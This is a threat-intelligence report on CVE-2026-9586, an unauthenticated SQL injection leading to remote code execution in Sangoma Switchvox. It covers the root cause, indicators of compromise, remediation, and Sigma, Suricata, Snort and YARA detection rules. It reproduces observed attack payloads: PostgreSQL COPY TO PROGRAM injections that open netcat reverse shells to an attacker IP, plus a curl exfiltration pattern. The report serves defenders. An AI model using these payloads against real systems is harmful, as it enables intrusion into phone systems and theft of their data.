# Technical Analysis Report: CVE-2026-9586 Sangoma Switchvox Unauthenticated SQLi to RCE (2026-09-02)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-09-02
Version: 1.1 REVISED

## Executive Summary

CVE-2026-9586 is a critical (CVSS 4.0: 9.3) unauthenticated SQL injection vulnerability in Sangoma Switchvox SMB Edition that enables remote code execution via a single crafted HTTP request. The flaw resides in the `/pa` phone provisioning endpoint, which concatenates user-controlled XML input (`PhoneIP` field) directly into PostgreSQL queries without sanitization. Attackers escalate from SQL injection to OS-level command execution using PostgreSQL's `COPY TO PROGRAM` feature, deploying reverse shells on compromised systems. Active exploitation has been observed since August 30, 2026, originating from IP 176.65.148[.]184, with approximately 4,000 internet-exposed Switchvox instances identified as potential targets (predominantly in the United States). The vulnerability was patched in version 8.4.0.2, released July 14, 2026. It is not currently listed in the CISA KEV catalog despite confirmed in-the-wild exploitation.

## Background: Sangoma Switchvox SMB Edition

Sangoma Switchvox is a unified communications (UC) platform providing PBX, voicemail, and phone management features targeted at small and medium businesses. The `/pa` endpoint handles phone provisioning for Polycom IP handsets, processing XML-formatted requests to configure and register phones on the system. The endpoint is deliberately unauthenticated to allow phones to self-provision, making it an exposed attack surface when reachable from untrusted networks. The backend runs PostgreSQL as a database superuser, and the application logic is implemented in Perl (`PhoneAppsHandler.pm`), using `XML::Simple::XMLin()` for XML parsing.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-04-10 | Vulnerability reported to Sangoma by researchers |
| 2026-05 | Security Risk Advisors (SRA Labs) independently discovers and reports the flaw |
| 2026-07-14 | Sangoma releases patched version 8.4.0.2 |
| 2026-07-17 | CVE-2026-9586 published |
| 2026-08-30 | Active exploitation observed; Defused Cyber honeypots trigger valid exploit attempts |
| 2026-09-01 | Horizon3.ai publishes technical analysis confirming in-the-wild exploitation |

## Root Cause: Unsanitized SQL Query Concatenation in Phone Provisioning Endpoint

The vulnerability exists in `PhoneAppsHandler.pm`, specifically within the `tel_notify()` function (lines 220-226). The handler:

1. Receives an HTTP POST to `/pa/` with an XML body
2. Validates only that the XML begins with `<PolycomIPPhone>` (no content sanitization)
3. Parses the XML using `XML::Simple::XMLin()` to extract untrusted data
4. Extracts the `PhoneIP` field value without any input validation
5. Concatenates the raw value directly into an unparameterized SQL query:

```sql
SELECT proposed_extension FROM auto_phone_config WHERE ip_address = '[INJECTION_POINT]'
```

Because the endpoint requires no authentication and the PostgreSQL connection runs as superuser, a single crafted request achieves arbitrary SQL execution.

## Technical Analysis of the Malicious Payload

### 1. Initial Access: SQL Injection via XML Payload

The attacker sends a POST request to `/pa/` containing a crafted XML body:

```xml
<PolycomIPPhone>
  <PhoneIP>[SQL_INJECTION_PAYLOAD]</PhoneIP>
</PolycomIPPhone>
```

The injection occurs within a single-quoted SQL string context. The attacker breaks out of the string and appends arbitrary SQL statements.

### 2. Code Execution: PostgreSQL COPY TO PROGRAM

Attackers leverage PostgreSQL's `COPY TO PROGRAM` feature to execute OS commands. The observed payload pattern:

```sql
'; COPY (SELECT '') TO PROGRAM 'nc 176.65.148[.]184 39323 | sh' --
```

A more complete payload observed in the wild:

```sql
'; COPY (SELECT '') TO PROGRAM 'nc 10.0.18.42 4444 -e /bin/bash > /tmp/0d012120ab00297d.txt 2>&1; chmod 644 /tmp/0d012120ab00297d.txt' --
```

This establishes a reverse shell back to attacker-controlled infrastructure while redirecting output to a temporary file.

### 3. C2 Infrastructure

**Attacker IP:** 176.65.148[.]184 (flagged on VirusTotal for port scanning, brute-force, and exploitation activity)

**Reverse shell ports observed:**
- TCP/39323 (primary observed port)
- TCP/4444 (secondary reverse shell attempts)

**Post-exploitation exfiltration mechanism:**

```
curl -m 10 http://[ATTACKER_IP]/[ATTEMPT_ID]_$(base64_encoded_command)
```

The base64-decoded reconnaissance command performs process enumeration:

```bash
top -bn1 | awk '/^ *PID/ {getline; print $1, $12, $9}'
```

### 4. Platform-Specific Behavior

#### Linux (Switchvox runs CentOS/RHEL-based)

- **Delivery:** HTTP POST to `/pa/` endpoint
- **Execution:** PostgreSQL superuser `COPY TO PROGRAM` spawns shell commands
- **Persistence:** Reverse shell via `nc` (netcat) piped to `sh` or with `-e /bin/bash`
- **Reconnaissance:** Process enumeration via `top -bn1` with base64-encoded curl exfiltration
- **Artifacts:** Temporary files written to `/tmp/` (e.g., `/tmp/0d012120ab00297d.txt`)
- **Log evidence:** SQL injection payloads recorded in `/var/log/switchvox/db-quirks.log`

### 5. Additional Capabilities

Beyond RCE, the SQL injection enables:
- **Database content exfiltration** — reading all tables
- **User record modification** — creating or elevating Switchvox web admin accounts
- **Cookie signing key extraction** — enabling authentication forgery and session hijacking
- **Credential theft** — accessing stored credentials in the database

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - IP addresses: `[.]` replacing dots (e.g., `176.65.148[.]184`)

### Package / Software Level

| Package / Component | Vulnerable Version | Description |
|---------------------|-------------------|-------------|
| Sangoma Switchvox SMB Edition | 8.3 (build 104997) and all versions prior to 8.4.0.2 | Unauthenticated SQLi in `/pa` endpoint |

### File System

| Platform | Path | Description |
|----------|------|-------------|
| Linux | `/var/log/switchvox/db-quirks.log` | Contains SQL injection payload evidence |
| Linux | `/tmp/0d012120ab00297d.txt` | Observed reverse shell output file |
| Linux | `PhoneAppsHandler.pm` (Perl module) | Vulnerable handler containing `tel_notify()` |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 176.65.148[.]184 | Active exploitation source; port scanning, brute-force, exploitation |
| Port | TCP/39323 | Reverse shell listener observed on attacker IP |
| Port | TCP/4444 | Secondary reverse shell port |
| URL Pattern | `POST /pa/` with XML body | Exploit delivery endpoint |
| URL Pattern | `http://[ATTACKER_IP]/[ID]_[base64]` | Post-exploitation data exfiltration via curl |

### Behavioral

- PostgreSQL process spawning child shell processes (`/bin/sh`, `/bin/bash`, `nc`, `curl`, `wget`)
- HTTP POST requests to `/pa` containing `<PolycomIPPhone>` XML with single-quote SQL escape characters
- HTTP POST bodies to `/pa` containing `COPY` and `TO PROGRAM` keywords
- Outbound connections from Switchvox systems to unexpected external IPs on non-standard ports
- Temporary files created in `/tmp/` with hex-string filenames
- Entries in `db-quirks.log` containing shell metacharacters (`|`, `;`, `>`, `nc`, `curl`, `bash`)

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1190 | Exploit Public-Facing Application | Unauthenticated SQL injection to the `/pa` endpoint via crafted XML POST request |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | `COPY TO PROGRAM` executes shell commands including `nc`, `sh`, `bash` |
| T1048.003 | Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | Base64-encoded process data exfiltrated via HTTP GET to attacker IP |
| T1057 | Process Discovery | Process enumeration via `top -bn1`; database content extraction |
| T1550.004 | Use Alternate Authentication Material: Web Session Cookie | Cookie signing key extraction enables authentication forgery for admin access |
| T1595 | Active Scanning | Pre-exploitation scanning of ~4,000 exposed Switchvox instances |

## Impact Assessment

- **Breadth:** Approximately 4,000 internet-exposed Switchvox instances, predominantly in the United States
- **Depth:** Full system compromise — unauthenticated RCE as PostgreSQL superuser enables complete control of the Switchvox appliance and all stored communications data
- **Stealth:** Moderate — exploitation leaves artifacts in `db-quirks.log` but may not trigger standard web application firewalls if `/pa` is allowlisted for phone provisioning traffic
- **Exposure window:** Vulnerability known since April 2026; patch available since July 14, 2026; active exploitation since August 30, 2026 — systems unpatched for 7+ weeks remain at critical risk

## Detection & Remediation

### Immediate Detection

1. **Check exploitation logs:**
```bash
grep -i "COPY.*TO PROGRAM\|PhoneIP.*'" /var/log/switchvox/db-quirks.log
```

2. **Check for suspicious temporary files:**
```bash
ls -la /tmp/*.txt | grep -E '[0-9a-f]{16}\.txt'
```

3. **Check for active reverse shells:**
```bash
netstat -tlnp | grep -E '(nc|ncat|bash|sh)' 
ss -tlnp | grep -v LISTEN | grep -E '(39323|4444)'
```

4. **Check firewall/proxy logs for attacker IP:**
```
grep '176.65.148.184' /var/log/messages /var/log/httpd/access_log
```

### Remediation

1. **Immediate:** Upgrade to Switchvox 8.4.0.2 or later
2. **If patching is delayed:** Restrict network access to the `/pa` endpoint via firewall rules to trusted IP phone subnets only — block all external/internet access to this endpoint
3. **If compromised:** Isolate the system, rotate all database credentials, regenerate cookie signing keys, audit admin accounts for unauthorized additions or privilege changes, and rebuild from a known-good backup
4. **Rotate credentials:** Change all Switchvox web admin passwords and API keys; invalidate all active sessions

### Long-Term Hardening

- Never expose phone provisioning endpoints (`/pa`) to the public internet
- Implement network segmentation between voice infrastructure and general-purpose networks
- Deploy a web application firewall (WAF) in front of Switchvox with rules blocking SQL injection patterns
- Enable audit logging and forward logs to a SIEM for monitoring
- Establish a patching SLA for internet-facing UC/VoIP systems

## Detection Rules

These rules target the specific exploit chain for CVE-2026-9586: SQL injection via the `/pa` endpoint's `PhoneIP` XML field escalated to RCE through PostgreSQL `COPY TO PROGRAM`. The single caveat across all rules is that legitimate Polycom phone provisioning traffic also hits `/pa`, so the higher-confidence rules key on the SQL injection payload content rather than the endpoint alone.

<!-- VALIDATION NOTES (v1.1 REVISED)
Sigma rules: sigma check failed due to MITRE ATT&CK data endpoint unreachable (HTTP 403 from proxy).
Structural/semantic validation performed via sigma convert to splunk and log_scale backends (both succeeded for all 3 rules, including revised Rules 1 and 3).
Suricata rules: suricata -T -S passed for both rules (Suricata 7.0.3). No changes in revision.
YARA rules: yarac compiled successfully (exit code 0). No changes in revision.
Snort rule: marked uncompiled (snort not available in toolchain). depth:3->4, sid:2100101->2100103 in revision.
All detection values use real (non-defanged) indicators per logsource-encoding spec.
-->
<!-- revision: defanged IP in line-62 SQL payload code block; ATT&CK T1078->T1550.004, T1005->T1057, T1048->T1048.003; Sigma Rule 1 confidence high->medium + CommandLine filter; Sigma Rule 3 startswith->exact match; Snort depth:3->4 + sid:2100103 -->

### Sigma Rule 1: PostgreSQL COPY TO PROGRAM Shell Spawn

Detects the post-exploitation signature of PostgreSQL spawning shell processes, which is the direct consequence of `COPY TO PROGRAM` exploitation on Switchvox.
<!-- revision: downgraded confidence high->medium; added CommandLine filter for COPY/TO PROGRAM strings to scope to Switchvox exploit chain and reduce altitude mismatch -->
**Compile: sigma convert splunk/log_scale PASSED | Confidence: medium**

```yaml
title: CVE-2026-9586 PostgreSQL COPY TO PROGRAM Spawning Shell on Switchvox
id: 7a3e8c1f-4b2d-4e6a-9f01-c5d8b7e2a3f6
status: experimental
description: >
    Detects PostgreSQL process spawning shell commands whose command line
    contains COPY TO PROGRAM strings, indicative of CVE-2026-9586 SQL
    injection exploitation on Sangoma Switchvox systems. Scoped to
    Switchvox-related artifacts to reduce false positives from generic
    PostgreSQL maintenance.
references:
    - https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/
    - https://labs.sra.io/posts/switchvox/
author: Actioner
date: 2026-09-02
tags:
    - attack.t1190
    - attack.t1059.004
logsource:
    category: process_creation
    product: linux
detection:
    selection_parent:
        ParentImage|endswith: '/postgres'
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/nc'
            - '/ncat'
            - '/curl'
            - '/wget'
    selection_cmdline:
        CommandLine|contains:
            - 'COPY'
            - 'TO PROGRAM'
    condition: selection_parent and selection_cmdline
falsepositives:
    - PostgreSQL maintenance scripts using COPY TO PROGRAM for legitimate exports
level: medium
```

### Sigma Rule 2: Known Attacker IP

Detects inbound connections from the IP observed actively exploiting CVE-2026-9586 in the wild since August 30, 2026.
**Compile: sigma convert splunk/log_scale PASSED | Confidence: high (time-limited IOC)**

```yaml
title: CVE-2026-9586 Inbound Connection from Known Switchvox Exploitation IP
id: b4f1d2e8-9c3a-4d7b-8e5f-a6c0d1b3e2f4
status: experimental
description: >
    Detects inbound network connections from IP address 176.65.148.184,
    which was observed actively exploiting CVE-2026-9586 against Sangoma
    Switchvox systems from August 30, 2026 onward.
references:
    - https://thehackernews.com/2026/09/attackers-exploit-critical-switchvox.html
    - https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/
author: Actioner
date: 2026-09-02
tags:
    - attack.t1190
logsource:
    category: firewall
detection:
    selection:
        src_ip: '176.65.148.184'
    condition: selection
falsepositives:
    - Unlikely - this IP is flagged for port scanning, brute-force, and exploitation activity
level: high
```

### Sigma Rule 3: Webserver POST to Vulnerable Endpoint

Detects HTTP POST requests to the vulnerable `/pa` provisioning endpoint, filtered to exclude normal `.cfg` configuration file requests from legitimate phones.
<!-- revision: changed cs-uri-stem|startswith '/pa' to exact-match list ['/pa','/pa/'] to avoid matching /pages, /password, /panel etc. -->
**Compile: sigma convert splunk/log_scale PASSED | Confidence: medium**

```yaml
title: CVE-2026-9586 Switchvox POST Request to Vulnerable /pa Endpoint
id: e2a7f3b1-6d4c-4e8a-b9f0-d1c5e3a2b4d6
status: experimental
description: >
    Detects HTTP POST requests to the Sangoma Switchvox /pa phone
    provisioning endpoint. This endpoint is the attack surface for
    CVE-2026-9586 unauthenticated SQL injection. High volume from
    non-phone subnets warrants investigation.
references:
    - https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/
    - https://labs.sra.io/posts/switchvox/
author: Actioner
date: 2026-09-02
tags:
    - attack.t1190
logsource:
    category: webserver
detection:
    selection:
        cs-method: 'POST'
        cs-uri-stem:
            - '/pa'
            - '/pa/'
    filter_phones:
        cs-uri-stem|contains: '.cfg'
    condition: selection and not filter_phones
falsepositives:
    - Legitimate Polycom IP phone provisioning requests from trusted subnets
level: medium
```

### Suricata Rule 1: COPY TO PROGRAM in Switchvox /pa Request

Detects the high-fidelity exploit payload: a POST to `/pa` with `PolycomIPPhone` XML containing SQL `COPY TO PROGRAM` commands.
**Compile: suricata -T PASSED (Suricata 7.0.3) | Confidence: high**

```
alert http any any -> $HOME_NET any (msg:"Actioner - CVE-2026-9586 Switchvox SQLi RCE via COPY TO PROGRAM"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/pa"; startswith; http.request_body; content:"PolycomIPPhone"; content:"PhoneIP"; distance:0; content:"COPY"; distance:0; nocase; content:"TO PROGRAM"; distance:0; nocase; fast_pattern; classtype:web-application-attack; reference:cve,2026-9586; reference:url,horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/; metadata:author Actioner, created_at 2026-09-02; sid:2100101; rev:1;)
```

### Suricata Rule 2: SQL Injection Attempt in PolycomIPPhone XML

Detects the broader SQLi attempt pattern: POST to `/pa` with `<PolycomIPPhone>` XML containing a single-quote SQL escape character in the body — the entry point for injection.
**Compile: suricata -T PASSED (Suricata 7.0.3) | Confidence: medium**

```
alert http any any -> $HOME_NET any (msg:"Actioner - CVE-2026-9586 Switchvox SQLi Attempt via PolycomIPPhone XML"; flow:established,to_server; http.method; content:"POST"; http.uri; content:"/pa"; startswith; http.request_body; content:"<PolycomIPPhone>"; fast_pattern; content:"<PhoneIP>"; distance:0; content:"'"; distance:0; classtype:web-application-attack; reference:cve,2026-9586; reference:url,labs.sra.io/posts/switchvox/; metadata:author Actioner, created_at 2026-09-02; sid:2100102; rev:1;)
```

### Snort Rule: COPY TO PROGRAM in Switchvox /pa Request

Snort 3 equivalent of Suricata Rule 1 for environments running Snort.
<!-- revision: depth:3 -> depth:4 to match "/pa/" (4 bytes); sid:2100101 -> sid:2100103 to avoid collision with Suricata Rule 1 -->
**Compile: NOT COMPILED (snort not available) | Confidence: high**

```
alert http any any -> $HOME_NET any (msg:"Actioner - CVE-2026-9586 Switchvox SQLi RCE via COPY TO PROGRAM"; flow:established, to_server; http_method; content:"POST"; http_uri; content:"/pa", fast_pattern, depth:4; http_client_body; content:"PolycomIPPhone"; content:"COPY", nocase, distance:0; content:"TO PROGRAM", nocase, distance:0; classtype:web-application-attack; reference:cve,2026-9586; reference:url,horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/; metadata:author Actioner, created 2026-09-02; sid:2100103; rev:1;)
```

### YARA Rule 1: Exploit Payload Detection

Detects CVE-2026-9586 exploit payloads in PCAP files, HTTP request captures, or log archives containing the PolycomIPPhone XML with SQL COPY TO PROGRAM.
**Compile: yarac PASSED | Confidence: high**

```yara
rule Exploit_CVE_2026_9586_Switchvox_SQLi_Payload
{
    meta:
        description = "Detects CVE-2026-9586 exploit payload targeting Sangoma Switchvox /pa endpoint via PolycomIPPhone XML with SQL injection containing COPY TO PROGRAM"
        author = "Actioner"
        date = "2026-09-02"
        reference = "https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $xml_tag = "<PolycomIPPhone>" ascii nocase
        $phone_ip = "<PhoneIP>" ascii nocase
        $sqli_copy = "COPY" ascii nocase fullword
        $sqli_to_program = "TO PROGRAM" ascii nocase

    condition:
        $xml_tag and $phone_ip and $sqli_copy and $sqli_to_program
}
```

### YARA Rule 2: Reverse Shell Payload Detection

Detects the reverse shell variant of the CVE-2026-9586 exploit where netcat or bash shell commands appear alongside the PolycomIPPhone SQL injection.
**Compile: yarac PASSED | Confidence: high**

```yara
rule Exploit_CVE_2026_9586_Switchvox_Reverse_Shell
{
    meta:
        description = "Detects reverse shell payload patterns associated with CVE-2026-9586 Switchvox exploitation including netcat and bash reverse shells in SQL context"
        author = "Actioner"
        date = "2026-09-02"
        reference = "https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/"
        severity = "critical"
        tlp = "WHITE"

    strings:
        $xml_tag = "<PolycomIPPhone>" ascii nocase
        $phone_ip = "<PhoneIP>" ascii nocase
        $revshell1 = "nc " ascii
        $revshell2 = "/bin/bash" ascii
        $revshell3 = "/bin/sh" ascii
        $revshell4 = "| sh" ascii
        $sqli_marker = "COPY" ascii nocase fullword

    condition:
        $xml_tag and $phone_ip and $sqli_marker and 1 of ($revshell*)
}
```

## Lessons Learned

1. **Phone provisioning endpoints are high-value targets.** Endpoints designed for unauthenticated device self-registration (a common pattern in VoIP/UC systems) become critical attack surfaces when exposed to the internet. Network segmentation and firewall restrictions to phone-only subnets are essential.

2. **PostgreSQL superuser + SQL injection = immediate RCE.** The `COPY TO PROGRAM` feature is an intended PostgreSQL capability that becomes a weaponizable primitive when combined with SQL injection. Applications using PostgreSQL should connect with least-privilege database roles that lack superuser rights.

3. **The patch-to-exploit window is narrowing.** With the patch released July 14 and active exploitation detected August 30 (a 47-day gap), organizations that defer patching of internet-facing systems by even a few weeks face real exploitation risk. Automated patch management and exposure monitoring for UC/VoIP infrastructure deserves the same urgency as web application patching.

## Sources

- [The Hacker News - Attackers Exploit Critical Switchvox Flaw](https://thehackernews.com/2026/09/attackers-exploit-critical-switchvox.html) — initial reporting on active exploitation, IOCs, and timeline
- [Horizon3.ai - CVE-2026-9586 Disclosure](https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/) — primary technical analysis with exploit chain, payload structure, and IOCs
- [SRA Labs - Advisory: Sangoma Switchvox SMB](https://labs.sra.io/posts/switchvox/) — independent discovery and vulnerability disclosure with technical details
- [IONIX Threat Center - CVE-2026-9586](https://www.ionix.io/threat-center/cve-2026-9586/) — vulnerability context, CVSS scoring, and remediation guidance
- [CVEFeed.io - CVE-2026-9586](https://cvefeed.io/vuln/detail/CVE-2026-9586) — CWE classification, CVSS vector, and NVD references
- [Sangoma Release Notes v8.4.0.2](https://sangomakb.atlassian.net/wiki/spaces/Switchvox/pages/1802371073/Switchvox+-+Release+Notes+Version+8.4.0.2+July+14+2026) — vendor patch release notes

---
*Report generated by Actioner*
